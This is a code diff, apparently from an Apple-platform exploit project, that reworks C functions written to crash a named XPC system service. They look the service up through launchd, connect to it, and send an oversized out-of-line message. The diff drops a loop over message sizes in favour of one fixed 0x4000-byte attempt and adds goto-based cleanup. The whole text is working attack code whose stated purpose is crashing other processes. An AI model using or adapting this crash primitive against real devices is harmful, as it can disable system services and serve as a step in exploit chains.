@@ -139,7 +139,7 @@ have_no_senders_notification(mach_port_t notify_port) {
 // Try to crash the specified XPC connection using a message of the specified size.
 static bool
 xpc_crash_with_size(mach_port_t server_port, mach_port_t client_port, mach_port_t notify_port,
-		size_t xpc_data_size, bool *crash) {
+		size_t xpc_data_size, bool *crashed) {
 	void *xpc_data = xpc_crash_build_ool_data(xpc_data_size);
 	if (xpc_data == NULL) {
 		return false;
@@ -191,37 +191,40 @@ xpc_crash_with_size(mach_port_t server_port, mach_port_t client_port, mach_port_
 		return true;
 	}
 	DEBUG_TRACE(1, "Crashed with size 0x%zx", xpc_data_size);
-	*crash = true;
+	*crashed = true;
 	return true;
 }
 
 // Try to crash the specified XPC service.
 bool
 xpc_crash(const char *service) {
-	bool success = false;
+	bool crashed = false;
 	mach_port_t service_port = launchd_lookup_service(service);
 	if (service_port == MACH_PORT_NULL) {
-		return false;
+		goto fail_0;
 	}
-	for (size_t pages = 1; !success && pages <= 100; pages++) {
-		mach_port_t server_port, client_port;
-		bool ok = xpc_connect(service_port, &server_port, &client_port);
-		if (!ok) {
-			break;
-		}
-		mach_port_t notify_port = create_no_senders_notification_port(client_port);
-		size_t size = pages * 0x4000;
-		ok = xpc_crash_with_size(server_port, client_port, notify_port, size, &success);
-		mach_port_destroy(mach_task_self(), notify_port);
-		mach_port_deallocate(mach_task_self(), server_port);
-		mach_port_destroy(mach_task_self(), client_port);
-		if (!ok) {
-			break;
-		}
+	mach_port_t server_port, client_port;
+	bool ok = xpc_connect(service_port, &server_port, &client_port);
+	if (!ok) {
+		ERROR("Could not connect to service %s", service);
+		goto fail_1;
 	}
-	if (!success) {
+	mach_port_t notify_port = create_no_senders_notification_port(client_port);
+	const size_t crash_size = 0x4000;
+	ok = xpc_crash_with_size(server_port, client_port, notify_port, crash_size, &crashed);
+	if (!ok) {
+		ERROR("Could not send crashing message to service %s", service);
+		goto fail_2;
+	}
+	if (!crashed) {
 		ERROR("Could not crash service %s", service);
 	}
+fail_2:
+	mach_port_destroy(mach_task_self(), notify_port);
+	mach_port_deallocate(mach_task_self(), server_port);
+	mach_port_destroy(mach_task_self(), client_port);
+fail_1:
 	mach_port_deallocate(mach_task_self(), service_port);
-	return success;
+fail_0:
+	return crashed;
 }
